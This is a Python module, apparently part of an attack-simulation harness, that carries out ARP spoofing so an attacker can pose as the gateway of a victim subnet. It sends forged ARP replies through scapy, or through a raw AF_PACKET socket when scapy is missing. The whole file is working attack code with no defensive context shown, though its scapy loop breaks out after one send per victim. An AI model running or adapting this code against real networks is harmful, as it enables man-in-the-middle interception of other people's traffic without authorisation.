"""ARP spoof — attacker pretends to be the gateway of a victim subnet.

Usa scapy si está disponible; sino genera ARP reply crudo via socket(AF_PACKET).
"""

from __future__ import annotations

import ipaddress
import socket
import struct
import time


def run(cfg: dict) -> int:
    spoof_ip = cfg["spoof_as"]
    duration = cfg["duration_s"]
    rate = cfg.get("rate_pps", 10)
    period = 1.0 / max(rate, 0.01)

    try:
        from scapy.all import ARP, Ether, sendp  # type: ignore
        sc_ok = True
    except Exception:
        sc_ok = False

    end = time.time() + duration
    if sc_ok:
        from scapy.all import ARP, Ether, sendp  # noqa
        for victim in ipaddress.IPv4Network(cfg["victims_subnet"]).hosts():
            pkt = Ether() / ARP(op=2, psrc=spoof_ip, pdst=str(victim))
            while time.time() < end:
                sendp(pkt, verbose=False)
                time.sleep(period)
                break
        return 0

    # fallback raw socket
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    except (AttributeError, OSError):
        print("[!] AF_PACKET no disponible — ARP spoof requiere Linux + root")
        return 1
    iface = "eth0"
    try:
        sock.bind((iface, 0))
    except OSError:
        return 1
    src_mac = b"\x02\x1f\x7d\x00\x99\x00"
    while time.time() < end:
        for victim in ipaddress.IPv4Network(cfg["victims_subnet"]).hosts():
            if time.time() >= end:
                break
            arp = (
                struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2)
                + src_mac
                + socket.inet_aton(spoof_ip)
                + b"\xff" * 6
                + socket.inet_aton(str(victim))
            )
            eth = b"\xff" * 6 + src_mac + b"\x08\x06"
            try:
                sock.send(eth + arp)
            except OSError:
                pass
            time.sleep(period)
    return 0
